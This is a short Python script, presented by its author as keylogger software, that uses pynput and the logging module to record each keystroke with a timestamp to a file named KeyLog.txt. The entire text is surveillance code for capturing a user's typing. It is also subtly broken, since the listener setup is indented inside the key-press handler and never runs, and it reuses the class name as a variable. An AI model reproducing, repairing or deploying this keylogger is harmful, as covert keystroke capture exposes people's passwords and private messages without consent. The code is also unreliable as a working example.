#Hello, this is my Keylogger Sofware Code

#libraries
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "KeyLog.txt"), \
                     level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

    with Listener(on_press=on_press) as Listener:
        Listener.join()